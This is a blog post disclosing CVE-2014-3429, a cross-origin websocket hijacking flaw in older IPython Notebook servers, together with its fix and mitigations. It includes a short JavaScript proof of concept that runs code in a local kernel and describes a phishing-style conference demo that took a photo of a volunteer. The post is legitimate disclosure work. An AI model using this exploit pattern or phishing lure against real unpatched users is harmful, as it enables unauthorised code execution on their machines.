---
layout: post
title:  "One Weird Kernel Trick"
date:   2014-06-16 20:01
categories: IPython, Jupyter, security
permalink: "/cross-origin-websocket-hijacking-of-ipython/"
---

# Hijacking the IPython Notebook's WebSockets

**TL; DR** *On IPython ≤ 1.1, the Notebook server suffered from a flaw where it did not verify the origin of websocket requests.  An attacker with knowledge of an active IPython kernel ID could run arbitrary code on a user's machine with the privileges of the user running the IPython kernel if the client visited a crafted malicious page.  This was corrected upstream in the 1.2.0 and 2.0.0 releases.*

## The IPython Notebook

For those that don't know, the IPython Notebook is an in-browser application for interactive computing where you can combine code, prose, mathematics, plots, and other rich media into a single document as well as  [share with peers](http://nbviewer.ipython.org/):

![](https://d23f6h5jpj26xu.cloudfront.net/rxluj5w6w1li9q_small.png)

The overall setup makes interactively working with code and data a breeze. Behind the scenes, the browser is communicating with IPython kernels (execution environments) over websockets.

![](https://d23f6h5jpj26xu.cloudfront.net/huzp0asjwourg_small.png)

These websockets make communication with the kernels very quick, but they have additional security concerns.

## Websockets and Cross Origin Restrictions

Modern browsers prevent JavaScript on one site from accessing content on another site. This prevents, for example, `twitter.com` from accessing your bank accounts on `mint.com`.

<script>
// Insert diagram of CORS
</script>

The story is different for websockets. Unlike builtin cross origin handling by modern browsers, the websocket specification has no such concept. The protection has to be done by the server. Some methods include:

* Authenticating requests
* Verifying Origin and Host
* Validating a `Sec-WebSocket-Key`

If these aren't setup for a given server, any remote site that you visit can access the websockets on that server. `example.com` can, with client side javascript, open a websocket to `yourbank.com`, from the comfort of JavaScript in *your* browser.

## Cross Origin Websockets and IPython

Prior to [pull request #4845](https://github.com/ipython/ipython/pull/4845), the IPython Notebook did not perform origin verification. For notebook servers using authentication, this wasn't a problem (cookies are needed as part of authentication).

However, most users typically run the notebook locally with a default port (e.g. `127.0.0.1:8888`) and no authentication. It's only running on localhost not exposed to the web, what could go wrong? Well, an attacker could open `ws://127.0.0.1:8888/api/kernels/{some kernel id}` from their separate domain. Stated again, *any website could attempt to open up a websocket on your local machine with a little bit of JavaScript and knowledge of a kernel id*.

Simple example:

```JavaScript
// Create a basic Kernel object
var kernel = new IPython.Kernel();

// Use the default URL
kernel.ws_url = "ws://127.0.0.1:8888";
// Prior to this, acquire a kernel_id
kernel.kernel_url = "/kernels/" + kernel_id;
kernel.kernel_id = kernel_id;

kernel.start_channels();

// ...
// Trigger execution once you know the kernel is connected
// (there's an event for that):
kernel.execute('import os; os.mkdir("touchdown")');
```

If a site can use a kernel without your knowledge, they can run *anything* they want *as you on your local, trusty machine*. [Remove all your files](http://lambdaops.com/rm-rf-remains), plop down some special purpose code, steal your data, and generally wreak havoc. Yikes.

### Demo

![](http://i.imgur.com/UscjI81.gif)

### Verifying Origin and Host

The vulnerability was fixed in time for the IPython 2.0 release (April 2014) and backported for the 1.x series (1.2 and above), as part of [#4845](https://github.com/ipython/ipython/pull/4845). We simply verify that the origin of the request matches the host. To make sure this light amount of protection happened by default I also submitted a [pull request to the tornado web framework](https://github.com/tornadoweb/tornado/pull/980).

This vulnerability is registered with 
CVE ID [CVE-2014-3429](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3429).

## Mitigations

This entire attack relies on knowledge of the id of the kernel. Considering this is a [UUID generated using uuid4](https://github.com/ipython/ipython/blob/rel-1.1.0/IPython/kernel/multikernelmanager.py#L105), this can't be brute forced in any reasonable amount of time. The more practical way is to use some amount of social engineering (see SciPy Gift Card demo below).

The only proactive mitigation you have if using an old version of the notebook is to set a password hash in your IPython Notebook configuration:

```python
c.NotebookApp.password = u'sha1:c43e9fe995cb73d73aca557de521d48...'
```

To create a password hash, use `IPython.lib.passwd()`:

```
In [1]: from IPython.lib import passwd
In [2]: passwd()
Enter password:
Verify password:
Out[2]: 'sha1:67c9e60bb8b6:9ffede0825894254b2e042ea597d771089e11aed'
```

If you're stuck on an old version and haven't upgraded, please do! You'll also get access to IPython widgets if you upgrade to 2.x. 

## Lightning Talk at SciPy 2014

![](https://d23f6h5jpj26xu.cloudfront.net/vg8f9kjehosdcq_small.png)

The inimitable [Paul Ivanov](https://twitter.com/ivanov) let me use him on stage as part of the exploit's demonstration. Paul loves Philz Coffee (it is, in fact, incredible coffee), so I set up a phishing site just for him:

![](https://d23f6h5jpj26xu.cloudfront.net/wsy2vdai9lbbxg_small.png)

While I was able to show Paul his kernel IDs in an iframe, normal CORS protections prevented my javascript from grabbing the IDs directly. Paul had to enter the "gift card code" (a kernel id for a running kernel) manually.

Doing so ran some deviously playful AppleScript that [Min](https://twitter.com/minrk) wrote to open Photobooth and take Paul's picture on stage:

```JavaScript
var code = '%%bash\n' +
           'osascript -e \'tell application "Photo Booth" to activate\n' + 
           'delay 6\n' + 
           'tell application "Photo Booth"\n' +
           'activate\n' + 
           'tell application "System Events" to keystroke return using {command down}\n' + 
           'end tell\n\'';
```

<blockquote class="twitter-tweet" lang="en"><p>Remote execution confirmed! Snuck a picture of <a href="https://twitter.com/ivanov">@ivanov</a> during the &quot;One Weird Kernel Trick&quot; talk. <a href="http://t.co/IVSAesvRei">pic.twitter.com/IVSAesvRei</a></p>&mdash; Kyle R Kelley (@rgbkrk) <a href="https://twitter.com/rgbkrk/statuses/487363111897145345">July 10, 2014</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

Success

### Other References

* [Slides from Lightning Talk at SciPy 2014](https://speakerdeck.com/rgbkrk/one-weird-kernel-trick-hijacking-ipython-websockets)
* [Lightning Talk at SciPy 2014](http://youtu.be/ln4nE_EVDCg?t=44m30s), at 44:30.
* There is an exploitation demo, but I've decided to tear that down and not link it because someone with a fortuitous network position (e.g. your router, your ISP, the person winking at you in the local coffee shop) could modify HTTP packets and run arbitrary code on your system. I'm willing to open source the demo though with enough pestering.

---------

*For all my blog posts I've decided to hold discussion on Reddit, linking to the post. Today's post has been posted to [/r/python](http://www.reddit.com/r/Python/comments/2am4le/vulnerability_in_ipython_notebook_11_cross_origin/) as well as [/r/netsec](http://www.reddit.com/r/netsec/comments/2ao18a/cross_site_websocket_hijacking_of_localhost_via/). Feel free to cross-post it and [PM me](http://www.reddit.com/message/compose/?to=lambdaops) so I can link it here. Alternatively, [reach me on Twitter](https://twitter.com/rgbkrk).*
